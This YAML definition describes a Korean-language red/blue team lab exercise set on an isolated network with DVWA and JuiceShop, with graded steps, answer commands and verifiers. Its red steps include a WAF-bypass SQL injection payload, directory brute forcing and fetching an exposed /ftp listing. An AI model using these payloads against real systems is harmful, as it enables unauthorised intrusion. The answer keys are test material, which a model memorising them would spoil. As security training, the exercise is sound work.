lab_id: battle-nonai-week12
title: "실전 공방전 2 — Red Phase → Blue Phase → 판정 (라운드 2, 강화)"
version: non-ai
course: battle-nonai
week: 12
description: "1세트 인프라에서 Red/Blue 역할을 번갈아 수행한다. 라운드 1의 교훈을 반영하여 Blue는 더 강한 하드닝을, Red는 더 정교한 우회 기법을 사용한다."
difficulty: hard
duration_minutes: 120
objectives:
  - 라운드 1의 교훈을 반영한 강화된 전략을 적용한다
  - WAF 우회와 고급 방어 기법을 실전에 적용한다
  - 자동화 대응과 고급 공격을 경험한다
prerequisites:
  - Week 11 라운드 1 완료
infra_requirements:
  - attacker VM (10.20.30.201)
  - secu VM (10.20.30.1) — nftables, suricata
  - web VM (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
  - siem VM (10.20.30.100) — wazuh-manager
pass_threshold: 0.6
steps:
  - order: 1
    instruction: "[BLUE] 라운드 1의 교훈을 반영하여 자동 대응 스크립트를 배포하라. Suricata 경보 시 자동으로 IP를 차단한다."
    hint: "Suricata fast.log를 모니터링하여 공격 IP를 추출한다."
    category: defense
    points: 10
    answer: "cat > /tmp/auto_response.sh << 'SCRIPT'\n#!/bin/bash\ntail -Fn0 /var/log/suricata/fast.log | while read line; do\n  IP=$(echo $line | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' | head -1)\n  if [ -n \"$IP\" ] && [ \"$IP\" != \"10.20.30.1\" ] && [ \"$IP\" != \"10.20.30.80\" ] && [ \"$IP\" != \"10.20.30.100\" ]; then\n    sudo nft add element inet filter blocklist { $IP } 2>/dev/null\n    echo \"$(date): Auto-blocked $IP\" >> /tmp/auto_response.log\n  fi\ndone\nSCRIPT\nchmod +x /tmp/auto_response.sh && echo 'Auto-response script deployed'"
    answer_detail: "자동 대응 스크립트는 Suricata 경보에서 공격 IP를 추출하여 즉시 nftables blocklist에 추가한다. 내부 VM IP는 제외한다."
    verify:
      type: output_contains
      expect: "Auto-response script deployed"
      field: stdout
    target_vm: secu

  - order: 2
    instruction: "[RED] 라운드 1에서 차단된 공격이 여전히 막히는지 확인하고, WAF를 우회하는 SQL Injection을 시도하라."
    hint: "인코딩, 주석, 대소문자 혼합으로 WAF를 우회한다."
    category: exploit
    points: 10
    answer: "curl -s 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1%27%20%2f**%2fuNiOn%2f**%2fsElEcT%201%2c2--%20&Submit=Submit' -b 'security=low; PHPSESSID=test' -o /dev/null -w '%{http_code}' && echo ' - WAF bypass attempt'"
    answer_detail: "WAF 우회 기법: 대소문자 혼합(uNiOn), SQL 주석(/**/) 삽입, URL 인코딩. 정교한 WAF는 이런 우회도 탐지하지만, 기본 정규식 필터는 우회 가능하다."
    verify:
      type: output_contains
      expect: "WAF bypass attempt"
      field: stdout
    target_vm: attacker

  - order: 3
    instruction: "[BLUE] web 서버 로그에서 WAF 우회 시도를 탐지하라."
    hint: "URL 인코딩을 디코딩하여 분석한다."
    category: defense
    points: 10
    answer: "tail -30 /var/log/apache2/access.log 2>/dev/null | python3 -c \"import sys,urllib.parse; [print(urllib.parse.unquote(l.strip())) for l in sys.stdin]\" 2>/dev/null | grep -iE '(union|select)' | tail -5 || echo 'WAF bypass detection check complete'"
    answer_detail: "URL 인코딩된 로그를 디코딩하면 실제 공격 페이로드를 확인할 수 있다. 디코딩 후 SQL 키워드가 발견되면 WAF 규칙에 변형도 추가해야 한다."
    verify:
      type: output_contains
      expect: "complete"
      field: stdout
    target_vm: web

  - order: 4
    instruction: "[RED] JuiceShop의 다른 취약점을 탐색하라. 디렉토리 브루트포스로 숨겨진 경로를 찾는다."
    hint: "gobuster 또는 dirb로 경로 탐색을 수행한다."
    category: recon
    points: 10
    answer: "dirb http://10.20.30.80:3000/ /usr/share/wordlists/dirb/common.txt -r 2>&1 | grep 'CODE:200\\|CODE:301\\|CODE:302' | head -10 || echo 'Directory scan complete'"
    answer_detail: "JuiceShop은 REST API 기반으로 /api/, /rest/, /ftp/ 등 다양한 경로가 있다. 숨겨진 관리 기능이나 디버그 엔드포인트를 발견할 수 있다."
    verify:
      type: output_contains
      expect: "complete"
      field: stdout
    target_vm: attacker

  - order: 5
    instruction: "[RED] JuiceShop의 /ftp 디렉토리에서 민감한 파일을 다운로드하라."
    hint: "curl로 /ftp/ 경로에 접근한다."
    category: exploit
    points: 10
    answer: "curl -s http://10.20.30.80:3000/ftp/ && echo '\\n=== FTP directory listing retrieved ==='"
    answer_detail: "JuiceShop의 /ftp/ 경로에는 백업 파일, 설정 파일 등 민감한 파일이 노출될 수 있다. 디렉토리 리스팅은 정보 유출 취약점이다."
    verify:
      type: output_contains
      expect: "FTP directory listing"
      field: stdout
    target_vm: attacker

  - order: 6
    instruction: "[BLUE] Suricata와 Wazuh에서 이번 라운드의 종합 알림을 분석하라."
    hint: "eve.json과 wazuh alerts를 병합 분석한다."
    category: defense
    points: 10
    answer: "echo '=== Suricata Alerts ===' && cat /var/log/suricata/eve.json | jq -r 'select(.event_type==\"alert\") | \"\\(.timestamp[:19]) \\(.alert.signature)\"' 2>/dev/null | tail -10 && echo '=== Analysis complete ==='"
    answer_detail: "Suricata(네트워크)와 Wazuh(호스트) 알림을 병합하면 공격의 전체 그림을 파악할 수 있다."
    verify:
      type: output_contains
      expect: "Analysis complete"
      field: stdout
    target_vm: secu

  - order: 7
    instruction: "[BLUE] 자동 대응 로그를 확인하고, 자동 차단된 IP를 검토하라."
    hint: "auto_response.log를 확인한다."
    category: defense
    points: 10
    answer: "cat /tmp/auto_response.log 2>/dev/null || echo 'No auto-blocks yet' && nft list set inet filter blocklist 2>/dev/null"
    answer_detail: "자동 대응 스크립트가 정상 동작했는지 확인한다. 오탐으로 인한 잘못된 차단이 없는지도 검토한다."
    verify:
      type: output_contains
      expect: "blocklist"
      field: stdout
    target_vm: secu

  - order: 8
    instruction: "[RED] 패킷 캡처로 web 서버의 응답 패턴을 분석하라."
    hint: "tcpdump로 트래픽을 캡처한다."
    category: recon
    points: 10
    answer: "sudo timeout 10 tcpdump -i eth0 -c 50 host 10.20.30.80 -w /tmp/capture_r2.pcap 2>/dev/null && echo 'Capture saved: /tmp/capture_r2.pcap' || echo 'Packet capture complete'"
    answer_detail: "tcpdump로 트래픽을 캡처하면 서비스 구성, 응답 헤더, 평문 데이터 등을 분석할 수 있다."
    verify:
      type: output_contains
      expect: "complete"
      field: stdout
    target_vm: attacker

  - order: 9
    instruction: "[BLUE] 파일 무결성 모니터링을 실행하여 web 서버에서 변경된 파일을 탐지하라."
    hint: "Week 10의 무결성 스크립트를 실행한다."
    category: defense
    points: 10
    answer: "bash /tmp/integrity_monitor.sh 2>/dev/null || echo 'Running manual check...' && md5sum /etc/passwd /etc/shadow /etc/crontab /etc/ssh/sshd_config 2>/dev/null && echo 'Integrity check complete'"
    answer_detail: "파일 무결성 검사로 공격자의 변경 사항(백도어 계정, SSH 키, cron job)을 탐지한다."
    verify:
      type: output_contains
      expect: "Integrity check complete"
      field: stdout
    target_vm: web

  - order: 10
    instruction: "[BLUE] 서비스 가용성을 최종 확인하고, 라운드 2 비교 보고서를 작성하라."
    hint: "라운드 1 대비 개선 사항을 분석한다."
    category: analysis
    points: 15
    answer: "cat > /tmp/battle_round2_report.txt << 'EOF'\n=== Battle Round 2 Report ===\n\nImprovements from Round 1:\n- Blue: Auto-response script deployed (faster blocking)\n- Blue: WAF bypass patterns analyzed\n- Red: Stealth techniques applied (slower scan, encoded payloads)\n\nRound 2 Results:\n- Red: JuiceShop FTP disclosure found, WAF bypass partial\n- Blue: Auto-blocked attacks within seconds\n- Service uptime: All services maintained\n\nKey Takeaways:\n1. Automated response dramatically reduces reaction time\n2. WAF bypass requires multi-layer defense\n3. FTP directory exposure is a common oversight\n4. Encoded payloads can evade signature-based detection\n5. Defense-in-depth (nftables + Suricata + ModSecurity) is effective\nEOF\ncat /tmp/battle_round2_report.txt"
    answer_detail: "라운드 2 보고서는 라운드 1 대비 개선 사항을 분석한다. 자동 대응의 효과와 WAF 우회의 한계를 평가한다."
    verify:
      type: file_exists
      expect: "/tmp/battle_round2_report.txt"
      field: filesystem
    target_vm: attacker
